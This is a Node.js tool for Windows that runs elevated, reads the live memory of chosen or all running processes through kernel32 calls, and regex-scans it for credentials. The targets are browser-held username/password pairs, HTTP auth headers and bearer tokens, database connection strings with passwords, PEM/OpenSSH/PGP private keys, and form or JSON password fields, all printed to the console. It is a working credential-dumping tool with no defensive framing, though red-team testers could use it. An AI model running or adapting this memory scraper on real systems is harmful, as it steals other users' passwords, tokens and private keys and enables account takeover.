'use strict';

const ffi = require('ffi-napi');
const ref = require('ref-napi');
const { execSync } = require('child_process');
const readline = require('readline');

const PROCESS_QUERY_INFORMATION = 0x0400;
const PROCESS_VM_READ = 0x0010;
const MEM_COMMIT = 0x1000;
const PAGE_READWRITE = 0x04;

// MEMORY_BASIC_INFORMATION layout for 64-bit Windows (48 bytes):
// BaseAddress(8) + AllocationBase(8) + AllocationProtect(4) + _pad(4)
// + RegionSize(8) + State(4) + Protect(4) + Type(4) + _pad(4)
const MBI_SIZE = 48;

function parseMBI(buf) {
  return {
    BaseAddress:       buf.readBigUInt64LE(0),
    AllocationBase:    buf.readBigUInt64LE(8),
    AllocationProtect: buf.readUInt32LE(16),
    RegionSize:        buf.readBigUInt64LE(24),
    State:             buf.readUInt32LE(32),
    Protect:           buf.readUInt32LE(36),
    Type:              buf.readUInt32LE(40),
  };
}

const kernel32 = ffi.Library('kernel32', {
  OpenProcess:       ['pointer', ['uint32', 'bool', 'int32']],
  ReadProcessMemory: ['bool',    ['pointer', 'uint64', 'pointer', 'uint32', 'pointer']],
  VirtualQueryEx:    ['uint64',  ['pointer', 'uint64', 'pointer', 'uint32']],
  CloseHandle:       ['bool',    ['pointer']],
});

// Each entry: { label, re, truncate? } — re must use the 'g' flag.
// truncate: if true, only the first 120 chars of the match are shown (used for key blocks).
const CRED_PATTERNS = [
  // Chromium-family browser in-memory layout: <proto> <user> <pass> NUL
  {
    label: 'browser_memory',
    re: /[a-zA-Z]https? ([a-zA-ZæøåÆØÅ0-9\-_\.@?]{3,20}) ([a-zA-ZæøåÆØÅ0-9#!@$%^&*()\-_+={}[\]:;<>?\/~]{6,40}) \x00/g,
  },
  // HTTP auth headers
  {
    label: 'http_basic_authentication_header',
    re: /Authorization:\s*Basic ([A-Za-z0-9+/=]{8,200})/g,
  },
  {
    label: 'http_bearer_authentication_header',
    re: /(?:Authorization:\s*)?Bearer ([A-Za-z0-9\-_=+/.]{20,500})/g,
  },
  // Database connection strings — capture groups: user, password
  {
    label: 'mongodb_connection_string',
    re: /mongodb(?:\+srv)?:\/\/([^:@\s"'\x00]{1,60}):([^@\s"'\x00]{4,100})@[^\s"'\x00]{4,200}/gi,
  },
  {
    label: 'mysql_connection_url',
    re: /mysql(?:2)?:\/\/([^:@\s"'\x00]{1,60}):([^@\s"'\x00]{4,100})@[^\s"'\x00]{4,200}/gi,
  },
  {
    label: 'postgres_connection_string',
    re: /postgres(?:ql)?:\/\/([^:@\s"'\x00]{1,60}):([^@\s"'\x00]{4,100})@[^\s"'\x00]{4,200}/gi,
  },
  // PEM / OpenSSH / PGP private keys.
  // [^-] is safe here: key bodies never contain hyphens, so the END marker
  // (which starts with -----) can never be consumed mid-match.
  {
    label: 'rsa_private_key',
    re: /-----BEGIN RSA PRIVATE KEY-----[^-]{100,4000}-----END RSA PRIVATE KEY-----/g,
    truncate: true,
  },
  {
    label: 'ec_private_key',
    re: /-----BEGIN EC PRIVATE KEY-----[^-]{50,2000}-----END EC PRIVATE KEY-----/g,
    truncate: true,
  },
  {
    label: 'generic_private_key',
    re: /-----BEGIN PRIVATE KEY-----[^-]{100,4000}-----END PRIVATE KEY-----/g,
    truncate: true,
  },
  {
    label: 'openssh_private_key',
    re: /-----BEGIN OPENSSH PRIVATE KEY-----[^-]{100,8000}-----END OPENSSH PRIVATE KEY-----/g,
    truncate: true,
  },
  {
    label: 'pgp_private_key',
    re: /-----BEGIN PGP PRIVATE KEY BLOCK-----[^-]{100,16000}-----END PGP PRIVATE KEY BLOCK-----/g,
    truncate: true,
  },
  // URL-encoded form submission: username=X&password=Y (fields adjacent)
  {
    label: 'form_encoded',
    re: /(?:username|user|login|email)=([^&\s\x00]{3,60})&(?:password|passwd|pwd|pass)=([^&\s\x00]{4,60})/gi,
  },
  // JSON credential field
  {
    label: 'json_password',
    re: /"(?:password|passwd|pwd|secret|token)":\s*"([^"\x00]{4,100})"/gi,
  },
  // Generic key=value or key: value password pair
  {
    label: 'kv_password',
    re: /[\s,{;](?:password|passwd|pwd)\s*[=:]\s*([^\s"'\x00&,\r\n]{4,60})/gi,
  },
];

function isElevated() {
  try {
    execSync('net session', { stdio: 'ignore' });
    return true;
  } catch {
    return false;
  }
}

function psExec(script) {
  const encoded = Buffer.from(script, 'utf16le').toString('base64');
  return execSync(`powershell -NoProfile -EncodedCommand ${encoded}`, {
    encoding: 'utf8',
    timeout: 15000,
  }).trim();
}

function getAllProcesses() {
  try {
    const raw = psExec(
      'Get-Process | Select-Object Id,ProcessName | Sort-Object ProcessName | ConvertTo-Json -Compress'
    );
    if (!raw) return [];
    const parsed = JSON.parse(raw);
    return Array.isArray(parsed) ? parsed : [parsed];
  } catch {
    return [];
  }
}

function buildProcessMenu(processes) {
  const grouped = new Map();
  for (const p of processes) {
    const name = p.ProcessName;
    if (!grouped.has(name)) grouped.set(name, []);
    grouped.get(name).push(Number(p.Id));
  }
  const names = [...grouped.keys()].sort((a, b) => a.localeCompare(b));
  return { grouped, names };
}

function printProcessMenu(names, grouped) {
  console.log('\n     0  [Scan all processes]');
  console.log('\n  #     Process Name                             Instances');
  console.log('  ----  ---------------------------------------- ---------');
  for (let i = 0; i < names.length; i++) {
    const name = names[i];
    const pids = grouped.get(name);
    const num  = String(i + 1).padStart(4);
    const col1 = name.padEnd(40);
    const col2 = pids.length === 1 ? `PID ${pids[0]}` : `${pids.length} instances`;
    console.log(`  ${num}  ${col1} ${col2}`);
  }
}

async function promptSelection(names, grouped) {
  return new Promise((resolve) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    rl.question('\nEnter number or partial name (0 = scan all): ', (answer) => {
      rl.close();
      const trimmed = answer.trim();

      if (trimmed === '0') return resolve({ all: true });

      const idx = parseInt(trimmed, 10) - 1;
      if (!isNaN(idx) && idx >= 0 && idx < names.length) {
        return resolve({ name: names[idx], pids: grouped.get(names[idx]) });
      }

      const lower = trimmed.toLowerCase();
      const match = names.find(n => n.toLowerCase().includes(lower));
      if (match) return resolve({ name: match, pids: grouped.get(match) });

      console.log('No matching process found.');
      resolve(null);
    });
  });
}

const MAX_RESULTS_PER_PID = 500;

// Returns { results: [{ label, display }], capped: bool } — does not print anything.
function scanPid(pid, seen) {
  const handle = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, pid);
  if (ref.isNull(handle)) return { results: [], capped: false };

  const results = [];
  let capped = false;

  try {
    let address = 0n;
    const mbiBuffer    = Buffer.alloc(MBI_SIZE);
    const bytesReadBuf = Buffer.alloc(8);

    outer:
    while (kernel32.VirtualQueryEx(handle, address.toString(), mbiBuffer, MBI_SIZE)) {
      const mbi      = parseMBI(mbiBuffer);
      const readable = mbi.State === MEM_COMMIT && mbi.Protect === PAGE_READWRITE;

      // Skip regions larger than 64 MB to limit peak Buffer allocation
      if (readable && mbi.RegionSize > 0n && mbi.RegionSize <= 0x4000000n) {
        const size   = Number(mbi.RegionSize);
        const memBuf = Buffer.alloc(size);

        if (kernel32.ReadProcessMemory(handle, mbi.BaseAddress.toString(), memBuf, size, bytesReadBuf)) {
          // Skip regions with high null-byte density — UTF-16 (V8 heap) or binary data.
          // Sampling 2 KB is enough; full scan of a 64 MB buffer for null bytes would be slow.
          const sampleSize = Math.min(2048, size);
          let nulls = 0;
          for (let b = 0; b < sampleSize; b++) if (memBuf[b] === 0) nulls++;
          if (nulls / sampleSize > 0.3) {
            const next = mbi.BaseAddress + mbi.RegionSize;
            if (next <= address || next > 0x7FFFFFFFFFFFFn) break;
            address = next;
            continue;
          }

          const text = memBuf.toString('utf8');

          for (const { label, re, truncate } of CRED_PATTERNS) {
            re.lastIndex = 0;
            let m;
            while ((m = re.exec(text)) !== null) {
              // Dedup on captured values only (not the surrounding context chars that
              // vary between occurrences of the same credential in different memory regions).
              const captured = m.slice(1).filter(Boolean).join(':');
              const raw      = m[0].replace(/[\x00-\x08\x0b-\x1f\x7f]/g, '.');
              const deduped  = `${label}:${captured || raw}`;
              if (seen.has(deduped)) continue;
              seen.add(deduped);

              let display = captured.replace(/:/g, '  |  ') || raw;
              if (truncate && display.length > 120) {
                display = display.slice(0, 120) + `  ... [${display.length} chars total]`;
              }
              results.push({ label, display });

              if (results.length >= MAX_RESULTS_PER_PID) {
                capped = true;
                break outer;
              }
            }
          }
        }
      }

      const next = mbi.BaseAddress + mbi.RegionSize;
      if (next <= address || next > 0x7FFFFFFFFFFFFn) break;
      address = next;
    }
  } finally {
    kernel32.CloseHandle(handle);
  }

  return { results, capped };
}

function printMatches(results) {
  for (const { label, display } of results) {
    console.log(`    [${label}] ${display}`);
  }
}

async function main() {
  if (!isElevated()) {
    process.stdout.write('\x1b[31m[x]\x1b[0m Not running elevated\n');
    process.exit(1);
  }

  process.stdout.write('\x1b[32m[v]\x1b[0m Running elevated\n');
  process.stdout.write('Fetching process list...');

  const allProcs = getAllProcesses();
  if (allProcs.length === 0) {
    console.log('\nFailed to fetch process list.');
    process.exit(1);
  }

  const { grouped, names } = buildProcessMenu(allProcs);
  console.log(` ${names.length} unique processes found.`);

  printProcessMenu(names, grouped);

  const selection = await promptSelection(names, grouped);
  if (!selection) process.exit(0);

  const seen = new Set();
  let totalMatches = 0;

  if (selection.all) {
    // Full scan — progress line overwrites in place; only processes with matches get a section.
    console.log(`\nScanning all ${names.length} processes...\n`);
    let matchedProcesses = 0;
    const PROGRESS_WIDTH = 70;

    for (let i = 0; i < names.length; i++) {
      const name = names[i];
      const pids = grouped.get(name);
      const progress = `  [${String(i + 1).padStart(4)}/${names.length}]  ${name}`;
      process.stdout.write(`\r${progress.padEnd(PROGRESS_WIDTH)}`);

      const byPid = [];
      for (const pid of pids) {
        const { results, capped } = scanPid(pid, seen);
        if (results.length) byPid.push({ pid, results, capped });
        totalMatches += results.length;
      }

      if (byPid.length) {
        // Lock in the progress line and print the match block below it.
        process.stdout.write('\n');
        console.log(`\n  ${name}`);
        for (const { pid, results, capped } of byPid) {
          if (pids.length > 1) console.log(`    PID ${pid}`);
          printMatches(results);
          if (capped) console.log(`    [capped at ${MAX_RESULTS_PER_PID} — re-run targeting this process for full output]`);
        }
        console.log();
        matchedProcesses++;
      }
    }

    // Clear the progress line.
    process.stdout.write(`\r${' '.repeat(PROGRESS_WIDTH)}\r`);
    console.log(`Scan complete — ${totalMatches} unique match(es) across ${matchedProcesses} process(es).`);

  } else {
    // Single process scan — show a section per PID, matches indented.
    const { name, pids } = selection;
    console.log(`\nScanning "${name}" (${pids.length} instance${pids.length > 1 ? 's' : ''})...\n`);

    for (const pid of pids) {
      const { results, capped } = scanPid(pid, seen);
      console.log(`  PID ${pid}  —  ${results.length ? `${results.length} match(es)` : 'no matches'}`);
      printMatches(results);
      if (capped) console.log(`  [capped at ${MAX_RESULTS_PER_PID} — increase MAX_RESULTS_PER_PID if needed]`);
      if (results.length) console.log();
      totalMatches += results.length;
    }

    console.log(`\nTotal: ${totalMatches} unique match(es)`);
  }
}

main().catch(err => {
  console.error('Error:', err.message);
  process.exit(1);
});
